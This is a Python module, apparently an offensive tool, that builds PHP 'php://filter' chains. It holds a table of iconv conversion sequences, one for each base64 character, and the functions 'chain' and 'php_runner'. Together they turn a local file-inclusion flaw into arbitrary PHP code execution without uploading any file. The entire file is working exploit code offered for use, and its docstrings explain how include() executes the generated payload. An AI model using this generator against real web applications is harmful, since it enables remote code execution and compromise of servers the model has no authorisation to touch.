"""Building bytes with a filter chain, rather than reading bytes that exist.

`php://filter` is usually met as a way of reading a file in another encoding.
The same primitive builds content that was never in any file: a stream of iconv
conversions that inserts one base64 character at a time, a base64 decode that
keeps only what it recognises, and a final decode that assembles the payload.
Handed to `include()`, that payload runs - so a parameter that only reads files
becomes a parameter that executes code, with no upload and no file on disk.

Why the table exists: an iconv conversion can be chosen so the byte it produces,
after the decoder throws away everything unrecognised, is exactly the character
wanted at that position. Each entry below is one such sequence, verified against
a real PHP build. That is empirical data, not something derivable at run time,
and it is the only reason this file is long.

The first three filters seed the stream: ISO-2022-KR opens with an escape
sequence, base64-encoding gives something to work with, and a UTF-7 conversion
removes the padding that would otherwise end decoding early.
"""

from __future__ import annotations

import base64

# What the chain reads at the end. An empty file is ideal: it contributes
# nothing, so every byte in the result came from the chain itself.
EMPTY_RESOURCE = "php://temp"

# One base64 character per entry. Applying an entry to the current content makes
# that character survive the decode that follows.
_INSERT: dict[str, str] = {
    "0": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2",
    "1": "convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4",
    "2": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921",
    "3": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE",
    "4": "convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE",
    "5": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2",
    "6": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2",
    "7": "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4",
    "8": "convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2",
    "9": "convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB",
    "A": "convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213",
    "B": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000",
    "C": "convert.iconv.UTF8.CSISO2022KR",
    "D": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213",
    "E": "convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT",
    "F": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB",
    "G": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90",
    "H": "convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213",
    "I": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213",
    "J": "convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4",
    "K": "convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE",
    "L": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC",
    "M": "convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T",
    "N": "convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4",
    "O": "convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775",
    "P": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB",
    "Q": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2",
    "R": "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4",
    "S": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS",
    "T": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103",
    "U": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943",
    "V": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB",
    "W": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936",
    "X": "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932",
    "Y": "convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361",
    "Z": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16",
    "a": "convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE",
    "b": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE",
    "c": "convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2",
    "d": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5",
    "e": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937",
    "f": "convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213",
    "g": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8",
    "h": "convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE",
    "i": "convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000",
    "j": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16",
    "k": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2",
    "l": "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE",
    "m": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949",
    "n": "convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61",
    "o": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE",
    "p": "convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4",
    "q": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2",
    "r": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101",
    "s": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90",
    "t": "convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS",
    "u": "convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61",
    "v": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2",
    "w": "convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE",
    "x": "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS",
    "y": "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT",
    "z": "convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937",
    "/": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4",
    "+": "convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157",
}

# The seed: an escape sequence to start the stream, an encoding to work with,
# and a conversion that eats the padding which would cut decoding short.
_SEED = (
    "convert.iconv.UTF8.CSISO2022KR",
    "convert.base64-encode",
    "convert.iconv.UTF8.UTF7",
)


def chain(payload: bytes, resource: str = EMPTY_RESOURCE) -> str:
    """A `php://filter` chain whose decoded content is `payload`.

    Read the result and you get the payload. Hand it to `include()` and the
    payload runs, which is the difference between seeing a file and becoming one.
    """
    encoded = base64.b64encode(payload).decode("ascii").replace("=", "")
    parts = list(_SEED)
    # Worked back to front: each step prepends what the next decode will keep,
    # so the payload is assembled in reverse and comes out in order.
    for character in reversed(encoded):
        insert = _INSERT.get(character)
        if insert is None:
            raise ValueError(f"no conversion produces {character!r}")
        if insert:
            parts.append(insert)
        parts.append("convert.base64-decode")
        parts.append("convert.base64-encode")
        parts.append("convert.iconv.UTF8.UTF7")
    parts.append("convert.base64-decode")
    return "php://filter/" + "|".join(parts) + f"/resource={resource}"


def php_runner(code: str, resource: str = EMPTY_RESOURCE) -> str:
    """A chain that yields a PHP document running `code`."""
    body = code if code.rstrip().endswith("?>") else f"{code} ?>"
    return chain(f"<?php {body}".encode(), resource=resource)
